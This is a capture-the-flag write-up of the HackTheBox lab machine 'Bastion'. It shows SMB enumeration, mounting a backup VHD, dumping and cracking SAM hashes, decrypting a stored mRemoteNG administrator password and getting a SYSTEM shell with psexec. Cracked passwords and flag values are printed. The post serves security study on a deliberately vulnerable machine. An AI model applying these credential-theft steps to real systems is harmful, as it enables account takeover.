---
layout: post
title: Hackthebox Bastion Walkthrough
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2019-09-08/bastion-badge.png)
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of machine "Bastion" on that website.<br>

## Solution
### 1. Initial Enumeration

TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.134 -sC -sV
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-06 11:58 EEST
Nmap scan report for 10.10.10.134
Host is up (0.041s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -37m27s, deviation: 1h09m16s, median: 2m31s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-09-06T11:02:54+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-09-06T09:02:53
|_  start_date: 2019-09-06T08:07:48

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.94 seconds
{% endhighlight %}

SMB Enumeration:
{% highlight shell %}
root@kali:~# smbclient -L \\10.10.10.134
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
{% endhighlight %}

### 2. Getting User

In the SMB share "Backups", we can find some files.
{% highlight shell %}
root@kali:~# smbclient //10.10.10.134/Backups
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Sep  6 11:11:13 2019
  ..                                  D        0  Fri Sep  6 11:11:13 2019
  note.txt                           AR      116  Tue Apr 16 13:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 14:43:08 2019
  user.config                         A     4175  Fri Feb 22 15:03:48 2019
  WindowsImageBackup                  D        0  Fri Feb 22 14:44:02 2019

		7735807 blocks of size 4096. 2756157 blocks available
{% endhighlight %}

In the "note.txt", we can find a message from system administrator.
{% highlight shell %}
root@kali:~# cat note.txt 

Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
{% endhighlight %}

Besides, by enumeration, we can find following "<a href="https://en.wikipedia.org/wiki/VHD_(file_format)">vhd</a>" files.
{% highlight shell %}
smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> dir
  .                                   D        0  Fri Feb 22 14:45:32 2019
  ..                                  D        0  Fri Feb 22 14:45:32 2019
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd      A 37761024  Fri Feb 22 14:44:03 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd      A 5418299392  Fri Feb 22 14:45:32 2019
  BackupSpecs.xml                     A     1186  Fri Feb 22 14:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml      A     1078  Fri Feb 22 14:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml      A     8930  Fri Feb 22 14:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml      A     6542  Fri Feb 22 14:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml      A     2894  Fri Feb 22 14:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml      A     1488  Fri Feb 22 14:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml      A     1484  Fri Feb 22 14:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml      A     3844  Fri Feb 22 14:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml      A     3988  Fri Feb 22 14:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml      A     7110  Fri Feb 22 14:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml      A  2374620  Fri Feb 22 14:45:32 2019

		7735807 blocks of size 4096. 2761056 blocks available
{% endhighlight %}

We don't wanna download the huge file but it is possible to enumerate the file content of the file.<br>
At first, create a directory and mount the SMB share.
{% highlight shell %}
root@kali:~# mkdir /mnt/bastion

root@kali:~# mount -t cifs //10.10.10.134/Backups /mnt/bastion
mount: /mnt/bastion: bad option; for several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.<type> helper program.
{% endhighlight %}

Got an error. According to <a href="https://askubuntu.com/questions/525243/why-do-i-get-wrong-fs-type-bad-option-bad-superblock-error">this article</a>, we have to install "cifs-utils".
{% highlight shell %}
root@kali:~# apt-get install cifs-utils

root@kali:~# mount -t cifs //10.10.10.134/Backups /mnt/bastion
Password for root@//10.10.10.134/Backups:

root@kali:~# ls -l /mnt/bastion/
total 1
-r-xr-xr-x 1 root root 116 Apr 16 13:10 note.txt
-rwxr-xr-x 1 root root   0 Feb 22  2019 SDT65CB.tmp
drwxr-xr-x 2 root root   0 Feb 22  2019 WindowsImageBackup
{% endhighlight %}

Then, create a device file nbd0 from the vhd file.<br>
Before that, we have to load nbd kernel module to run subsequent command.
{% highlight shell %}
root@kali:~# modprobe nbd

root@kali:~# qemu-nbd -r -c /dev/nbd0 '/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd'
{% endhighlight %}

Next, create a mount point and mount the created device file.<br>
We can figure out that the mounted disk is a Windows hard drive.
{% highlight shell %}
root@kali:~# mkdir /mnt/VHD

root@kali:~# mount /dev/nbd0p1 /mnt/VHD
Error opening '/dev/nbd0p1' read-write
Could not mount read-write, trying read-only

root@kali:~# ls -l /mnt/VHD/
total 2096729
drwxrwxrwx 1 root root          0 Feb 22  2019 '$Recycle.Bin'
-rwxrwxrwx 1 root root         24 Jun 11  2009  autoexec.bat
-rwxrwxrwx 1 root root         10 Jun 11  2009  config.sys
lrwxrwxrwx 2 root root         14 Jul 14  2009 'Documents and Settings' -> /mnt/VHD/Users
-rwxrwxrwx 1 root root 2147016704 Feb 22  2019  pagefile.sys
drwxrwxrwx 1 root root          0 Jul 14  2009  PerfLogs
drwxrwxrwx 1 root root       4096 Jul 14  2009  ProgramData
drwxrwxrwx 1 root root       4096 Apr 12  2011 'Program Files'
drwxrwxrwx 1 root root          0 Feb 22  2019  Recovery
drwxrwxrwx 1 root root       4096 Feb 22  2019 'System Volume Information'
drwxrwxrwx 1 root root       4096 Feb 22  2019  Users
drwxrwxrwx 1 root root      16384 Feb 22  2019  Windows
{% endhighlight %}

We can obtain the SYSTEM and SAM file since no process is using these files.
{% highlight shell %}
root@kali:~# cp /mnt/VHD/Windows/System32/config/SYSTEM .

root@kali:~# cp /mnt/VHD/Windows/System32/config/SAM .
{% endhighlight %}

Then, extract NTLM hash with samdump2.
{% highlight shell %}
root@kali:~# samdump2 SYSTEM SAM
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
{% endhighlight %}

Crack the hash with john the ripper.
{% highlight shell %}
root@kali:~# samdump2 SYSTEM SAM > hash.txt

root@kali:~# john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (*disabled* Administrator)
bureaulampje     (L4mpje)
2g 0:00:00:00 DONE (2019-09-08 00:53) 3.571g/s 16777Kp/s 16777Kc/s 16786KC/s burg772v..burdy1
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
{% endhighlight %}

We got the following credential and we can just ssh to the box.
{% highlight shell %}
L4mpje:bureaulampje
{% endhighlgiht %}
{% highlight shel %}
root@kali:~# ssh L4mpje@10.10.10.134
{% endhighlight %}

user.txt is in the following directory
{% highlight shell %}
l4mpje@BASTION C:\Users\L4mpje\Desktop>dir                                                
 Volume in drive C has no label.                                                          
 Volume Serial Number is 0CB3-C487                                                        

 Directory of C:\Users\L4mpje\Desktop                                                     

22-02-2019  16:27    <DIR>          .                                                     
22-02-2019  16:27    <DIR>          ..                                                    
23-02-2019  10:07                32 user.txt                                              
               1 File(s)             32 bytes                                             
               2 Dir(s)  11.307.810.816 bytes free                                        

l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt                                      
9bfe57d5c3309db3a151772f9d86c6cd         
{% endhighlight %}

unmount unneed devices:
{% highlight shell %}
root@kali:~# umount /dev/nbd0p1

root@kali:~# umount //10.10.10.134/Backups
umount: /mnt/bastion: target is busy.

root@kali:~# qemu-nbd -d /dev/nbd0p1
/dev/nbd0p1 disconnected

root@kali:~# umount //10.10.10.134/Backups
{% endhighlight %}

### 3. Getting Root

By enumeration, we can confirm that "mRemoteNG" is installed on the host.
{% highlight shell %}
l4mpje@BASTION C:\Program Files (x86)>dir                                       
 Volume in drive C has no label.                                                
 Volume Serial Number is 0CB3-C487                                              

 Directory of C:\Program Files (x86)                                            

22-02-2019  15:01    <DIR>          .                                           
22-02-2019  15:01    <DIR>          ..                                          
16-07-2016  15:23    <DIR>          Common Files                                
23-02-2019  10:38    <DIR>          Internet Explorer                           
16-07-2016  15:23    <DIR>          Microsoft.NET                               
22-02-2019  15:01    <DIR>          mRemoteNG                                   
23-02-2019  11:22    <DIR>          Windows Defender                            
23-02-2019  10:38    <DIR>          Windows Mail                                
23-02-2019  11:22    <DIR>          Windows Media Player                        
16-07-2016  15:23    <DIR>          Windows Multimedia Platform                 
16-07-2016  15:23    <DIR>          Windows NT                                  
23-02-2019  11:22    <DIR>          Windows Photo Viewer                        
16-07-2016  15:23    <DIR>          Windows Portable Devices                    
16-07-2016  15:23    <DIR>          WindowsPowerShell                           
               0 File(s)              0 bytes                                   
              14 Dir(s)  11.305.988.096 bytes free               
{% endhighlight %}

The credential for the mRemoteNG is stored in "confCons.xml".<br>
The config file is stored in "C:\Users\L4mpje\AppData\Roaming\mRemoteNG".<br>
Since it's hidden, we need to add "\a" for dir command to find AppData directory.
{% highlight shell %}
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>dir                    
 Volume in drive C has no label.                                                
 Volume Serial Number is 0CB3-C487                                              

 Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG                         

22-02-2019  15:03    <DIR>          .                                           
22-02-2019  15:03    <DIR>          ..                                          
22-02-2019  15:03             6.316 confCons.xml                                
22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup     
22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup     
22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup     
22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup     
22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup     
22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup     
22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup     
22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup     
22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup     
22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup     
22-02-2019  15:03                51 extApps.xml                                 
22-02-2019  15:03             5.217 mRemoteNG.log                               
22-02-2019  15:03             2.245 pnlLayout.xml                               
22-02-2019  15:01    <DIR>          Themes                                      
              14 File(s)         76.577 bytes                                   
               3 Dir(s)  11.305.988.096 bytes free       
{% endhighlight %}
{% highlight shell %}
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>type confCons.xml      
<?xml version="1.0" encoding="utf-8"?>                                          
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="f
alse" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFile
Encryption="false" Protected="ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL
5tKO886au0ofFPW0oop8R8ddXKAx4KK7sAk6AA" ConfVersion="2.6">                      
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" 
Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Pas
sword="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7em
f7lWWA10dQKiw==" Hostname="127.0.0.1" Protocol="RDP" PuttySession="Default Setti
ngs" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE"
 ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToI
dleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bi
t" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" Disp
layThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" C
acheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPri
nters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality=
"Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacA
ddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHexti
le" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0
" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode
="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostna
me="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPass
word="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" Inh
eritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="fa
lse" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" 
InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="
false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" I
nheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPort
s="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" Inhe
ritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" I
nheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp
="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryp
tionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToId
leTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="fal
se" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false"
 InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" In
heritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" 
InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="f
alse" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSi
zeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" In
heritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" 
InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatew
ayDomain="false" />                                                             
    <Node Name="L4mpje-PC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="Ge
neral" Id="8d3579b2-e68e-48c1-8f0f-9ee1347c9128" Username="L4mpje" Domain="" Pas
sword="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZV
vla8esB" Hostname="192.168.1.75" Protocol="RDP" PuttySession="Default Settings" 
Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAE
ncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTi
meout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Re
solution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayTh
emes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheB
itmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters
="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dyna
mic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddres
s="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" V
NCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNC
ProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="Sma
rtSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname=""
 RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword=
"" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritD
escription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" 
InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" Inher
itDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false
" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" Inheri
tRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="fa
lse" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRe
directSound="false" InheritSoundQuality="false" InheritResolution="false" Inheri
tAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="fal
se" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionS
trength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTim
eout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" I
nheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" Inhe
ritUserField="false" InheritExtApp="false" InheritVNCCompression="false" Inherit
VNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" Inher
itVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false"
 InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMod
e="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" Inherit
RDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" Inher
itRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDom
ain="false" />                                                                  
</mrng:Connections>                           
{% endhighlight %}

In the first line of "confCons.xml",there is a password for Administrator which is encrypted by mRemoteNG.
{% highlight shell %}
aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
{% endhighlight %}

By googling, we can find a <a href="https://github.com/haseebT/mRemoteNG-Decrypt">script</a> to decript this base64 encoded password.
{% highlight shell %}
root@kali:~# git clone https://github.com/haseebT/mRemoteNG-Decrypt

root@kali:~# python3 mRemoteNG-Decrypt/mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2
{% endhighlight %}

Now we got following credential for user Administrator.
{% highlight shell %}
Administrator:thXLHM96BeKL0ER2
{% endhighlight %}

To get inside as a Admin, we can use "psexec.py" in the package "Impacket".<br>
(We can also ssh to login)
{% highlight shell %}
root@kali:~# /usr/share/doc/python-impacket/examples/psexec.py administrator@10.10.10.134
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.134.....
[*] Found writable share ADMIN$
[*] Uploading file zdypCBbR.exe
[*] Opening SVCManager on 10.10.10.134.....
[*] Creating service dHza on 10.10.10.134.....
[*] Starting service dHza.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
{% endhighiglight %}

root.txt is in the directory "C:\Users\Administrator\Desktop".
{% highlight shell %}
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 0CB3-C487

 Directory of C:\Users\Administrator\Desktop

23-02-2019  10:40    <DIR>          .
23-02-2019  10:40    <DIR>          ..
23-02-2019  10:07                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  11.305.578.496 bytes free

C:\Users\Administrator\Desktop>type root.txt
958850b91811676ed6620a9c430e65c8
{% endhighlight %}
